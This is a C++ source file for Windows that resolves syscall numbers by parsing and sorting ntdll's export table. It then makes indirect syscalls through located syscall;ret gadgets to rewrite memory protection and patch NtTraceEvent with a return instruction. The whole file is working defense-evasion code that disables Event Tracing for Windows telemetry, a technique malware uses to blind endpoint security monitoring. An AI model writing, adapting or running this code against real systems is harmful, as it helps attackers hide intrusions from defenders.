#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

/*
* Define other NT stuff
*/
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)


/*
* Define structs
*/
typedef struct _SYSCALL_ENTRY {
    PVOID Address;
    std::string Name;
    SIZE_T Size;
} SYSCALL_ENTRY, * PSYSCALL_ENTRY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    PVOID ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

#ifdef _WIN64
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN BitField;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    // ... other members are not relevant
} PEB, * PPEB;
#else
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    // ... other members are not relevant
} PEB, * PPEB;
#endif

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

/*
* Define syscalls
*/
EXTERN_C NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten,
    int syscallID
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection,
    int syscallID
);

extern "C" void SetJumpAddress(uintptr_t jumpAddress);

/*
* Redefine winternl.h functions
*/
void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString == nullptr) {
        // If the source string is null, set the destination to zero
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = nullptr;
    }
    else {
        // Calculate the length of the source string
        size_t size = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = static_cast<USHORT>(size);
        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
    }
}

void InitializeObjectAttributes(
    POBJECT_ATTRIBUTES p,
    PUNICODE_STRING n,
    ULONG a,
    HANDLE r,
    PVOID s
) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = r;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = s;
    p->SecurityQualityOfService = nullptr; // Typically not used in basic scenarios
}

/*
* Retrieve the PEB of the current process
*/
PPEB GetPEB() {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    return peb;
}

/*
* Walk the PEB and find the base address of a module
*/
PVOID GetModuleBaseAddress(const wchar_t* moduleName) {
    PPEB peb = GetPEB();
    PLIST_ENTRY moduleList = &peb->Ldr->InLoadOrderModuleList;

    for (PLIST_ENTRY entry = moduleList->Flink; entry != moduleList; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (wcscmp(module->BaseDllName.Buffer, moduleName) == 0) {
            return module->DllBase;
        }
    }
    return nullptr; // Module not found
}

/*
* Functions to perform quicksorting
*/
int Partition(std::vector<SYSCALL_ENTRY>& arr, int low, int high) {
    auto pivot = arr[high];
    int i = (low - 1);

    for (int j = low; j < high; j++) {
        if (arr[j].Address < pivot.Address) {
            i++;
            std::swap(arr[i], arr[j]);
        }
    }
    std::swap(arr[i + 1], arr[high]);
    return (i + 1);
}

void QuickSort(std::vector<SYSCALL_ENTRY>& arr, int low, int high) {
    if (low < high) {
        int pi = Partition(arr, low, high);

        QuickSort(arr, low, pi - 1);
        QuickSort(arr, pi + 1, high);
    }
}

/*
* Parsing NTDLL's Export Address Table for syscalls
*/
std::vector<SYSCALL_ENTRY> syscallTable;
void ParseNtdllEAT() {
    HMODULE hNtdll = reinterpret_cast<HMODULE>(GetModuleBaseAddress(L"ntdll.dll"));
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hNtdll) + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<BYTE*>(hNtdll) + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pFunctions = reinterpret_cast<PDWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfFunctions);
    PDWORD pNames = reinterpret_cast<PDWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNames);
    PWORD pNameOrdinals = reinterpret_cast<PWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        PCHAR pFunctionName = reinterpret_cast<PCHAR>(reinterpret_cast<BYTE*>(hNtdll) + pNames[i]);
        if (strncmp(pFunctionName, "Zw", 2) == 0) {
            std::string modifiedName = "Nt" + std::string(pFunctionName + 2);

            SYSCALL_ENTRY entry;
            DWORD functionRVA = pFunctions[pNameOrdinals[i]];
            entry.Address = reinterpret_cast<PVOID>(reinterpret_cast<BYTE*>(hNtdll) + functionRVA);
            entry.Name = modifiedName;
            syscallTable.push_back(entry);
        }
    }

    // Quick sort syscallTable by address
    QuickSort(syscallTable, 0, syscallTable.size() - 1);

    /*
    for (int i = 0; i < syscallTable.size(); i++)
        std::cout << "Name: " << syscallTable[i].Name
        << "\nSyscall ID: " << std::hex << i
        << "\nAddress: " << syscallTable[i].Address
        << std::endl;
    */
}

/*
* Get syscall ID by function name
*/
int GetSyscall(std::string functionName) {
    for (SIZE_T i = 0; i < syscallTable.size(); ++i)
        if (syscallTable[i].Name == functionName)
            return i;
    std::cerr << "Function name not found: " << functionName << std::endl;
    return 00;
}

/*
* Get syscall address by function name
*/
PVOID GetAddress(std::string functionName) {
    for (SIZE_T i = 0; i < syscallTable.size(); ++i)
        if (syscallTable[i].Name == functionName)
            return syscallTable[i].Address;
    std::cerr << "Function name not found: " << functionName << std::endl;
    return 00;
}

uintptr_t FindSyscallOffset(std::string funcName) noexcept {
    INT64 offset = 0;
    BYTE signature[] = { 0x0F, 0x05, 0xC3 };

    uintptr_t pFunc = reinterpret_cast<uintptr_t>(GetAddress(funcName));
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pFunc);
    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(pFunc) + pDosHeader->e_lfanew);
    INT64 pSize = (pNtHeaders->OptionalHeader.SizeOfImage);
    BYTE* currentbytes = (BYTE*)pFunc;

    for (;;)
    {
        if (*(reinterpret_cast<BYTE*>(currentbytes)) == signature[0] &&
            *(reinterpret_cast<BYTE*>(currentbytes + 1)) == signature[1] &&
            *(reinterpret_cast<BYTE*>(currentbytes + 2)) == signature[2])
        {
            return pFunc + offset;
        }
        offset++;
        if (offset + 3 > pSize)
            return INFINITE;
        currentbytes = reinterpret_cast<BYTE*>(pFunc + offset);
    }
}

BOOL Unhook(std::string funcName, BYTE code[]) {
    std::cout << "[*] Unhooking function " << funcName << "..." << std::endl;
    uintptr_t jmpNtPVM = FindSyscallOffset("NtProtectVirtualMemory");
    uintptr_t jmpNtWVM = FindSyscallOffset("NtWriteVirtualMemory");
    int NtPVM = GetSyscall("NtProtectVirtualMemory");
    int NtWVM = GetSyscall("NtWriteVirtualMemory");
    PVOID addr = GetAddress(funcName);

    PVOID pAddr = addr;
    SIZE_T regionSize = 4096;
    SIZE_T codeSize = sizeof(code);
    ULONG protect, oldProtect;
    NTSTATUS status = NULL;
    
    // Prepare indirect syscall
    SetJumpAddress(jmpNtPVM);
    // Enable RWX permissions to allow overwriting
    status = NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect, NtPVM);
    if (!NT_SUCCESS(status)) {
        std::cout << "[-] NtProtectVirtualMemory failed. Status code: 0x" << std::hex << status << std::endl;
        return FALSE;
    }
    std::cout << "  [+] NtProtectVirtualMemory success!" << std::endl;
    
    // Prepare indirect syscall
    SetJumpAddress(jmpNtWVM);
    // Repatch opcode
    status = NtWriteVirtualMemory(NtCurrentProcess(), pAddr, code, codeSize, NULL, NtWVM);
    if (!NT_SUCCESS(status)) {
        std::cout << "[-] NtWriteVirtualMemory failed. Status code: 0x" << std::hex << status << std::endl;
        return FALSE;
    }
    std::cout << "  [+] NtWriteVirtualMemory success!" << std::endl;
    
    // Prepare indirect syscall
    SetJumpAddress(jmpNtPVM);
    // Revert memory protection
    status = NtProtectVirtualMemory(NtCurrentProcess(), &addr, &regionSize, oldProtect, &protect, NtPVM);
    if (!NT_SUCCESS(status)) {
        std::cout << "[-] NtProtectVirtualMemory failed. Status code: 0x" << std::hex << status << std::endl;
        return FALSE;
    }
    std::cout << "  [+] NtProtectVirtualMemory success!" << std::endl;
    
    std::cout << "[+] " << funcName << " Unhooked!" << std::endl;
    return TRUE;
}

int main() {
    ParseNtdllEAT();

    // Patch ETW by disabling NtTraceEvent
    BYTE patch[] = { 0xc3 };
    Unhook("NtTraceEvent", patch);

    return 0;
}
